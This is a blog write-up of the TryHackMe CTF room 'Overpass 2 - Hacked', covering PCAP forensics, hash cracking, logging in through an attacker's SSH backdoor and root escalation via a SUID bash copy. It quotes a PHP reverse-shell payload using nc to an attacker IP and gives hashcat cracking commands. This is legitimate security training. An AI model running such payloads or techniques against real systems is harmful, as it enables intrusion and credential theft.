---
title: Overpass 2 - Hacked (Try Hack Me)
author: Robin Goyal
date: 2021-08-29 13:25 -0400
categories: [Cybersecurity, Writeups]
tags: [thm, ctf, writeup]
hidden: true
image:
  src: https://tryhackme-images.s3.amazonaws.com/room-icons/96141387d9d4a22658f8db0ada67d62d.png
---

I am currently in the process of completing these boxes on Try Hack Me again in an effort to document my experience, reinforce my knowledge of the topics, and improve my ability to concisely communicate the pentest lifecycle.

## Forensics

The first few tasks in this room revolve around analysis of a PCAP file. This PCAP file contains a network traffic capture as to how the attacker entered the room and left a backdoor.

### Reverse Shell

The first few packets contain some normal HTTP traffic to a web server including a GET request to /development.

![get request](/assets/img/posts/thm-overpass-2/get-request.jpg)

The next TCP stream contains a POST request to /development with an upload.php file that looks like a reverse shell payload.

![upload](/assets/img/posts/thm-overpass-2/upload.jpg)

The payload is `<?php exec("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.170.145 4242 >/tmp/f")?>`

This payload contains the IP address and port of the listening host for the reverse shell. If we apply a display filter to the PCAP of `tcp.port == 4242`, we can quickly find the communication between the attacker's reverse shell and the system.

![reverse shell](/assets/img/posts/thm-overpass-2/reverse-shell.jpg)

I've shortened the output as the stream is fairly long but this stream contains the password for the user james, an output of the /etc/shadow file, and a backdoor that the attacker left behind.

### Password Cracking

We already have the password for the user james, `whatevernoteartinstant` but this password did not work for the SSH service on port 22. However, we have not yet enumerated the target machine so maybe that SSH service is not even listening? We shall check that out after once we finish analyzing this PCAP file.

Let's try to crack these passwords that we found in the packet capture.

![jtr](/assets/img/posts/thm-overpass-2/john.jpg)

So 4 of the 5 passwords were crackable!

```
bee: secret12
szymex: abcd123
muirland: 1qaz2wsx
paradox: secuirty3
```

### Backdoor

Now, let's check out the backdoor!
Going to the GitHub repository that maintains the backdoor, there are a few pieces of information that we can use to our advantage.

In the file main.go, the salt is present along with the default hash. However, the attacker used his own hash that is present in the packet capture file. Together, we might be able to find the password associated with that hash!

Hash: `6d05358f090eea56a238af02e47d44ee5489d234810ef6240280857ec69712a3e5e370b8a41899d0196ade16c0d54327c5654019292cbfe0b5e98ad1fec71bed`
Salt: `1c362db832f3f864c8c2fe05f2002a05`

Saving the above info in the format `hash:salt` and using hashcat, we found the password to be `november16`.

![hashcat](/assets/img/posts/thm-overpass-2/hashcat.jpg)

## Initial Foothold

From information in the packet capture, the backdoor SSH service is listening on port 2222 under the user james and we can provide the password that we cracked using hashcat.

`ssh james@10.10.125.145 -p 2222`

Success! We got access to the system as james. It looks like that the original password that james had `whatevernoteartinstant` does not work as the attacker may have modified it.

![user flag](/assets/img/posts/thm-overpass-2/user-flag.jpg)

Navigating to james' home directory, the user.txt flag is present.

## Privilege Escalation

It also looks like the attacker left a hidden backdoor file that would escalate his privileges to root.

![priv esc](/assets/img/posts/thm-overpass-2/priv-esc.jpg)

This file looks like it is just the bash binary but with the SUID bit enabled. Performing a diff on this file with the /bin/bash default binary shows that they are the exact same.

Therefore, we should be able to escalate our privileges by executing the SUID binary with the `-p` flag.

![root flag](/assets/img/posts/thm-overpass-2/root-flag.jpg)

## Useful Commands

### Cracking $6$ Linux Shadow Hashes

`hashcat -m 1800 -a 0 -o found.txt passwords.txt /usr/share/setoolkit/src/fasttrack/wordlist.txt`

### Cracking SHA512 with Salt and Hash

`hashcat -m 1710 -a 0 crackme.txt /usr/share/wordlists/rockyou.txt`

For the above mode, save the crackme.txt file as `hash:salt`.

## Reflection

This room is definitely one of my favorite so far because of how unique it is. The first half is focused on forensic analysis of a PCAP file and exploiting the same backdoor that a hacker has left.

In this room, I learned about:
- PCAP analysis
- Cracking SHA512 (Unix + normal?) hashes with salts using Hashcat and John the Ripper
- Reading GO source code

This is definitely a fantastic room to improve your Wireshark and password cracking skills as well as your ability to piece together information to understand the full picture of the exploitation path.
